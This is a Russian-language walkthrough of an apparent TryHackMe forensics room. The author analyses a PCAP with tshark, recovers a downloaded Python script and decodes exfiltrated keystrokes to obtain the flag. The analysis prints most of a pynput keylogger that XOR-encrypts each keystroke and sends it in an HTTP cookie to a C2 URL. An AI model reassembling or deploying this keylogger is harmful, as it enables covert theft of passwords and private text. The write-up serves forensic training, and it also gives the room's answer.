**Теги**: PCAP Analysis, Forensic Network, Cryptography.
**Сложность**: Easy.

## 1. Анализ PCAP

В этой комнате нам предоставлен файл `traffic.pcapng`. Наша задача — исследовать захваченный сетевой трафик и определить, что происходило внутри него.

Первым делом посмотрим общую иерархию протоколов:

```bash
tshark -r traffic.pcapng -q -z io,phs
```

Вывод:

```text
===================================================================
Protocol Hierarchy Statistics
Filter:

null                                     frames:171 bytes:8588
  ip                                     frames:171 bytes:8588
    tcp                                  frames:171 bytes:8588
      data                               frames:16 bytes:928
eth                                      frames:1177 bytes:502017
  arp                                    frames:3 bytes:162
  ip                                     frames:1174 bytes:501855
    tcp                                  frames:945 bytes:398033
      http                               frames:62 bytes:37862
        media                            frames:1 bytes:1140
          tcp.segments                   frames:1 bytes:1140
        data-text-lines                  frames:30 bytes:27840
          tcp.segments                   frames:30 bytes:27840
      tls                                frames:228 bytes:133744
        tcp.segments                     frames:21 bytes:17926
          tls                            frames:4 bytes:3444
    udp                                  frames:229 bytes:103822
      ssdp                               frames:32 bytes:12920
      dns                                frames:18 bytes:2382
      quic                               frames:179 bytes:88520
        quic                             frames:7 bytes:6798
          quic                           frames:2 bytes:2584
```

Особенно интересен HTTP-трафик. В PCAP присутствуют `62` HTTP-фрейма, поэтому дальше исследуем именно HTTP-запросы.

---

## 2. Поиск HTTP-запросов

Чтобы посмотреть, какие HTTP-ресурсы запрашивал клиент, используем:

```bash
tshark -r traffic.pcapng -Y http.request \
-T fields \
-e ip.src \
-e ip.dst \
-e http.host \
-e http.request.uri
```

Получаем:

```text
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/temp/updates.py
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
...
```

Самый интересный запрос:

```text
/temp/updates.py
```

То есть клиент скачивает Python-файл с сервера `byte-lotus-hotel.thm:8080`.

---

## 3. Восстановление содержимого TCP-потока

Теперь необходимо посмотреть содержимое TCP-соединения, в котором был передан `/temp/updates.py`.

Для этого используем:

```bash
tshark -r traffic.pcapng -q -z follow,tcp,ascii,5
```

Команда показывает содержимое TCP stream №5 в ASCII-виде.

В результате видим HTTP-запрос:

```text
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
```

Сервер отвечает:

```text
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed, 17 Jun 2026 05:38:38 GMT
Content-type: text/x-python
Content-Length: 1086
Last-Modified: Wed, 17 Jun 2026 05:30:02 GMT
```

Таким образом, сервер действительно отдаёт клиенту Python-скрипт `updates.py`.

---

## 4. Анализ Python-скрипта

В теле HTTP-ответа находится исходный код Python-программы.

Начало скрипта:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"
```

Здесь сразу видны три важных момента:

* используется `pynput.keyboard` — библиотека для перехвата нажатий клавиш;
* `requests` используется для отправки HTTP-запросов;
* `C2_URL` указывает на сервер, куда программа передаёт полученные данные.

### Ключ шифрования

Далее находится функция:

```python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
```

Она объединяет две строки:

```text
H0t3lSt@ff0Nly
K3epS3cr3t!
```

Получившийся ключ:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

Этот ключ впоследствии используется для XOR-шифрования перехваченных символов.

---

## 5. Как работало шифрование

Следующая функция реализует XOR:

```python
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

Для каждого байта входных данных выполняется XOR с соответствующим байтом ключа.

Выражение:

```python
key[i % len(key)]
```

означает, что если данные длиннее ключа, ключ начинает использоваться повторно с первого байта.

В данном случае каждый символ вводимого текста сначала превращается в UTF-8 bytes, после чего XOR-ится с ключом.

---

## 6. Как клавиши отправлялись на C2

Функция `sendltr()` принимает один символ:

```python
def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
```

То есть:

1. символ превращается в байты;
2. байты XOR-ятся с ключом.

Затем результат кодируется Base64:

```python
b64_string = base64.b64encode(encrypted).decode('utf-8')
```

После этого создаётся HTTP-заголовок:

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
    "Cookie": f"hotel_sess_state={b64_string}"
}
```

Таким образом, зашифрованный символ передаётся серверу не в теле POST-запроса, а внутри HTTP Cookie:

```text
hotel_sess_state=<Base64>
```

И затем выполняется GET-запрос:

```python
requests.get(C2_URL, headers=headers, timeout=0.5)
```

Следовательно, скрипт фактически реализует простой HTTP C2-канал: каждый нажатый символ отправляется серверу отдельным HTTP-запросом.

---

## 7. Перехват клавиатуры

Функция:

```python
def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")
```

обрабатывает нажатия клавиш.

Для обычной клавиши вызывается:

```python
sendltr(key.char)
```

Отдельно обрабатываются:

* `Space` → `" "`
* `Enter` → `"\n"`

Сам перехват запускается здесь:

```python
print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

Таким образом, программа постоянно ждёт нажатия клавиш и отправляет их на C2-сервер.

По сути, мы обнаружили **keylogger**, который отправляет перехваченные клавиши через HTTP, предварительно применяя XOR и Base64.

---

# 8. Извлечение Cookie из PCAP

Теперь, когда понятно, где именно передаются данные, извлекаем все HTTP Cookie из захваченного трафика:

```bash
tshark -r traffic.pcapng -Y "http.cookie" \
-T fields \
-e http.cookie
```

В результате получаем последовательность:

```text
hotel_sess_state=HA==
hotel_sess_state=AA==
hotel_sess_state=BQ==
hotel_sess_state=Mw==
hotel_sess_state=Hg==
hotel_sess_state=ew==
hotel_sess_state=Og==
hotel_sess_state=fA==
hotel_sess_state=Fw==
hotel_sess_state=eQ==
hotel_sess_state=Ow==
hotel_sess_state=Fw==
hotel_sess_state=Pw==
hotel_sess_state=fA==
hotel_sess_state=PA==
hotel_sess_state=Kw==
hotel_sess_state=IA==
hotel_sess_state=eQ==
hotel_sess_state=Jg==
hotel_sess_state=Lw==
hotel_sess_state=Fw==
hotel_sess_state=eA==
hotel_sess_state=Pg==
hotel_sess_state=LQ==
hotel_sess_state=Gg==
hotel_sess_state=Fw==
hotel_sess_state=MQ==
hotel_sess_state=eA==
hotel_sess_state=PQ==
hotel_sess_state=NQ==
```

Каждая строка соответствует одному отправленному символу.

Например:

```text
hotel_sess_state=HA==
```

— это Base64-представление зашифрованного байта первого символа.

Важно, что нельзя просто объединить эти Base64-строки и один раз декодировать результат: каждая строка представляет **отдельный зашифрованный символ**, поэтому их нужно обрабатывать по отдельности.

---

# 9. Написание декодера

Создаём Python-скрипт:

```bash
nano decode.py
```

В нём указываем тот же XOR-ключ, который был обнаружен в `updates.py`:

```python
import base64

key = b"H0t3lSt@ff0NlyK3epS3cr3t!"
```

Далее помещаем в переменную `data` все полученные из PCAP значения Base64:

```python
data = """
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
"""
```

После этого каждую строку декодируем из Base64:

```python
encrypted = base64.b64decode(item.strip())
```

Полученный байт расшифровываем тем же XOR-алгоритмом:

```python
decoded = bytes(
    b ^ key[i % len(key)]
    for i, b in enumerate(encrypted)
)
```

Расшифрованный символ добавляется к результирующей строке:

```python
result += decoded.decode()
```

В конце выводим получившийся текст:

```python
print(result)
```

---

# 10. Получение флага

Запускаем декодер:

```bash
python3 decode.py
```

Получаем:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```
---

## Как всё работало в целом

В этой комнате атака/сбор данных выглядела следующим образом:

```text
traffic.pcapng
      │
      ▼
HTTP-запрос
/temp/updates.py
      │
      ▼
Python keylogger
      │
      ├── перехватывает клавиши
      │
      ├── XOR с ключом
      │
      ├── Base64
      │
      ▼
HTTP Cookie
hotel_sess_state=<Base64>
      │
      ▼
PCAP
      │
      ▼
tshark извлекает Cookie
      │
      ▼
Base64 decode
      │
      ▼
XOR с найденным ключом
      │
      ▼
исходный текст
      │
      ▼
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

То есть **PCAP не содержал флаг в открытом виде**. Сначала из сетевого трафика мы восстановили вредоносный Python-скрипт, из него узнали алгоритм передачи и ключ XOR, затем извлекли отправленные Cookie и применили обратную операцию `Base64 → XOR`, после чего получили исходный текст и флаг.
